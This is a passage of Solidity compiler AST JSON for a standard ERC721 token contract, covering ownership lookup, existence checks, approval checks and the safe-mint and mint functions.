,"typeString":"bytes"}},"visibility":"internal"}],"src":"6446:100:1"},"returnParameters":{"id":450,"nodeType":"ParameterList","parameters":[],"src":"6564:0:1"},"scope":998,"src":"6424:305:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":480,"nodeType":"Block","src":"6913:40:1","statements":[{"expression":{"baseExpression":{"id":476,"name":"_owners","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":85,"src":"6930:7:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":478,"indexExpression":{"id":477,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":471,"src":"6938:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6930:16:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":475,"id":479,"nodeType":"Return","src":"6923:23:1"}]},"documentation":{"id":469,"nodeType":"StructuredDocumentation","src":"6735:98:1","text":" @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn't exist"},"id":481,"implemented":true,"kind":"function","modifiers":[],"name":"_ownerOf","nameLocation":"6847:8:1","nodeType":"FunctionDefinition","parameters":{"id":472,"nodeType":"ParameterList","parameters":[{"constant":false,"id":471,"mutability":"mutable","name":"tokenId","nameLocation":"6864:7:1","nodeType":"VariableDeclaration","scope":481,"src":"6856:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":470,"name":"uint256","nodeType":"ElementaryTypeName","src":"6856:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6855:17:1"},"returnParameters":{"id":475,"nodeType":"ParameterList","parameters":[{"constant":false,"id":474,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":481,"src":"6904:7:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":473,"name":"address","nodeType":"ElementaryTypeName","src":"6904:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"6903:9:1"},"scope":998,"src":"6838:115:1","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":498,"nodeType":"Block","src":"7327:55:1","statements":[{"expression":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":496,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":490,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":484,"src":"7353:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":489,"name":"_ownerOf","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":481,"src":"7344:8:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":491,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7344:17:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"hexValue":"30","id":494,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7373:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":493,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7365:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":492,"name":"address","nodeType":"ElementaryTypeName","src":"7365:7:1","typeDescriptions":{}}},"id":495,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7365:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"7344:31:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":488,"id":497,"nodeType":"Return","src":"7337:38:1"}]},"documentation":{"id":482,"nodeType":"StructuredDocumentation","src":"6959:292:1","text":" @dev Returns whether `tokenId` exists.\n Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.\n Tokens start existing when they are minted (`_mint`),\n and stop existing when they are burned (`_burn`)."},"id":499,"implemented":true,"kind":"function","modifiers":[],"name":"_exists","nameLocation":"7265:7:1","nodeType":"FunctionDefinition","parameters":{"id":485,"nodeType":"ParameterList","parameters":[{"constant":false,"id":484,"mutability":"mutable","name":"tokenId","nameLocation":"7281:7:1","nodeType":"VariableDeclaration","scope":499,"src":"7273:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":483,"name":"uint256","nodeType":"ElementaryTypeName","src":"7273:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7272:17:1"},"returnParameters":{"id":488,"nodeType":"ParameterList","parameters":[{"constant":false,"id":487,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":499,"src":"7321:4:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":486,"name":"bool","nodeType":"ElementaryTypeName","src":"7321:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"7320:6:1"},"scope":998,"src":"7256:126:1","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":532,"nodeType":"Block","src":"7639:162:1","statements":[{"assignments":[510],"declarations":[{"constant":false,"id":510,"mutability":"mutable","name":"owner","nameLocation":"7657:5:1","nodeType":"VariableDeclaration","scope":532,"src":"7649:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":509,"name":"address","nodeType":"ElementaryTypeName","src":"7649:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":515,"initialValue":{"arguments":[{"id":513,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":504,"src":"7680:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":511,"name":"ERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":998,"src":"7665:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ERC721_$998_$","typeString":"type(contract ERC721)"}},"id":512,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":199,"src":"7665:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":514,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7665:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"7649:39:1"},{"expression":{"components":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":529,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":523,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":518,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":516,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":502,"src":"7706:7:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":517,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":510,"src":"7717:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"7706:16:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"arguments":[{"id":520,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":510,"src":"7743:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":521,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":502,"src":"7750:7:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"}],"id":519,"name":"isApprovedForAll","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":363,"src":"7726:16:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_address_$returns$_t_bool_$","typeString":"function (address,address) view returns (bool)"}},"id":522,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7726:32:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"7706:52:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":528,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":525,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":504,"src":"7774:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":524,"name":"getApproved","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":328,"src":"7762:11:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":526,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7762:20:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":527,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":502,"src":"7786:7:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"7762:31:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"7706:87:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"id":530,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7705:89:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":508,"id":531,"nodeType":"Return","src":"7698:96:1"}]},"documentation":{"id":500,"nodeType":"StructuredDocumentation","src":"7388:147:1","text":" @dev Returns whether `spender` is allowed to manage `tokenId`.\n Requirements:\n - `tokenId` must exist."},"id":533,"implemented":true,"kind":"function","modifiers":[],"name":"_isApprovedOrOwner","nameLocation":"7549:18:1","nodeType":"FunctionDefinition","parameters":{"id":505,"nodeType":"ParameterList","parameters":[{"constant":false,"id":502,"mutability":"mutable","name":"spender","nameLocation":"7576:7:1","nodeType":"VariableDeclaration","scope":533,"src":"7568:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":501,"name":"address","nodeType":"ElementaryTypeName","src":"7568:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":504,"mutability":"mutable","name":"tokenId","nameLocation":"7593:7:1","nodeType":"VariableDeclaration","scope":533,"src":"7585:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":503,"name":"uint256","nodeType":"ElementaryTypeName","src":"7585:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7567:34:1"},"returnParameters":{"id":508,"nodeType":"ParameterList","parameters":[{"constant":false,"id":507,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":533,"src":"7633:4:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":506,"name":"bool","nodeType":"ElementaryTypeName","src":"7633:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"7632:6:1"},"scope":998,"src":"7540:261:1","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":547,"nodeType":"Block","src":"8196:43:1","statements":[{"expression":{"arguments":[{"id":542,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":536,"src":"8216:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":543,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":538,"src":"8220:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"","id":544,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"8229:2:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"id":541,"name":"_safeMint","nodeType":"Identifier","overloadedDeclarations":[548,577],"referencedDeclaration":577,"src":"8206:9:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$_t_bytes_memory_ptr_$returns$__$","typeString":"function (address,uint256,bytes memory)"}},"id":545,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8206:26:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":546,"nodeType":"ExpressionStatement","src":"8206:26:1"}]},"documentation":{"id":534,"nodeType":"StructuredDocumentation","src":"7807:319:1","text":" @dev Safely mints `tokenId` and transfers it to `to`.\n Requirements:\n - `tokenId` must not exist.\n - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n Emits a {Transfer} event."},"id":548,"implemented":true,"kind":"function","modifiers":[],"name":"_safeMint","nameLocation":"8140:9:1","nodeType":"FunctionDefinition","parameters":{"id":539,"nodeType":"ParameterList","parameters":[{"constant":false,"id":536,"mutability":"mutable","name":"to","nameLocation":"8158:2:1","nodeType":"VariableDeclaration","scope":548,"src":"8150:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":535,"name":"address","nodeType":"ElementaryTypeName","src":"8150:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":538,"mutability":"mutable","name":"tokenId","nameLocation":"8170:7:1","nodeType":"VariableDeclaration","scope":548,"src":"8162:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":537,"name":"uint256","nodeType":"ElementaryTypeName","src":"8162:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"8149:29:1"},"returnParameters":{"id":540,"nodeType":"ParameterList","parameters":[],"src":"8196:0:1"},"scope":998,"src":"8131:108:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":576,"nodeType":"Block","src":"8574:195:1","statements":[{"expression":{"arguments":[{"id":559,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":551,"src":"8590:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":560,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":553,"src":"8594:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":558,"name":"_mint","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":654,"src":"8584:5:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256)"}},"id":561,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8584:18:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":562,"nodeType":"ExpressionStatement","src":"8584:18:1"},{"expression":{"arguments":[{"arguments":[{"arguments":[{"hexValue":"30","id":567,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8664:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":566,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8656:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":565,"name":"address","nodeType":"ElementaryTypeName","src":"8656:7:1","typeDescriptions":{}}},"id":568,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8656:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":569,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":551,"src":"8668:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":570,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":553,"src":"8672:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":571,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":555,"src":"8681:4:1","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":564,"name":"_checkOnERC721Received","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":938,"src":"8633:22:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_memory_ptr_$returns$_t_bool_$","typeString":"function (address,address,uint256,bytes memory) returns (bool)"}},"id":572,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8633:53:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a207472616e7366657220746f206e6f6e20455243373231526563656976657220696d706c656d656e746572","id":573,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"8700:52:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","typeString":"literal_string \"ERC721: transfer to non ERC721Receiver implementer\""},"value":"ERC721: transfer to non ERC721Receiver implementer"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","typeString":"literal_string \"ERC721: transfer to non ERC721Receiver implementer\""}],"id":563,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"8612:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":574,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8612:150:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":575,"nodeType":"ExpressionStatement","src":"8612:150:1"}]},"documentation":{"id":549,"nodeType":"StructuredDocumentation","src":"8245:210:1","text":" @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is\n forwarded in {IERC721Receiver-onERC721Received} to contract recipients."},"id":577,"implemented":true,"kind":"function","modifiers":[],"name":"_safeMint","nameLocation":"8469:9:1","nodeType":"FunctionDefinition","parameters":{"id":556,"nodeType":"ParameterList","parameters":[{"constant":false,"id":551,"mutability":"mutable","name":"to","nameLocation":"8496:2:1","nodeType":"VariableDeclaration","scope":577,"src":"8488:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":550,"name":"address","nodeType":"ElementaryTypeName","src":"8488:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":553,"mutability":"mutable","name":"tokenId","nameLocation":"8516:7:1","nodeType":"VariableDeclaration","scope":577,"src":"8508:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":552,"name":"uint256","nodeType":"ElementaryTypeName","src":"8508:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":555,"mutability":"mutable","name":"data","nameLocation":"8546:4:1","nodeType":"VariableDeclaration","scope":577,"src":"8533:17:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":554,"name":"bytes","nodeType":"ElementaryTypeName","src":"8533:5:1","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"8478:78:1"},"returnParameters":{"id":557,"nodeType":"ParameterList","parameters":[],"src":"8574:0:1"},"scope":998,"src":"8460:309:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":653,"nodeType":"Block","src":"9152:859:1","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":591,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":586,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":580,"src":"9170:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"hexValue":"30","id":589,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9184:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":588,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9176:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":587,"name":"address","nodeType":"ElementaryTypeName","src":"9176:7:1","typeDescriptions":{}}},"id":590,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9176:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"9170:16:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a206d696e7420746f20746865207a65726f2061646472657373","id":592,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"9188:34:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6","typeString":"literal_string \"ERC721: mint to the zero address\""},"value":"ERC721: mint to the zero address"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6","typeString":"literal_string \"ERC721: mint to the zero address\""}],"id":585,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"9162:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":593,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9162:61:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":594,"nodeType":"ExpressionStatement","src":"9162:61:1"},{"expression":{"arguments":[{"id":599,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"9241:17:1","subExpression":{"arguments":[{"id":597,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":582,"src":"9250:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":596,"name":"_exists","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":499,"src":"9242:7:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_bool_$","typeString":"function (uint256) view returns (bool)"}},"id":598,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9242:16:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a20746f6b656e20616c7265616479206d696e746564","id":600,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"9260:30:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","typeString":"literal_string \"ERC721: token already minted\""},"value":"ERC721: token already minted"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","typeString":"literal_string \"ERC721: token already minted\""}],"id":595,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"9233:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":601,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9233:58:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":602,"nodeType":"ExpressionStatement","src":"9233:58:1"},{"expression":{"arguments":[{"arguments":[{"hexValue":"30","id":606,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9331:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 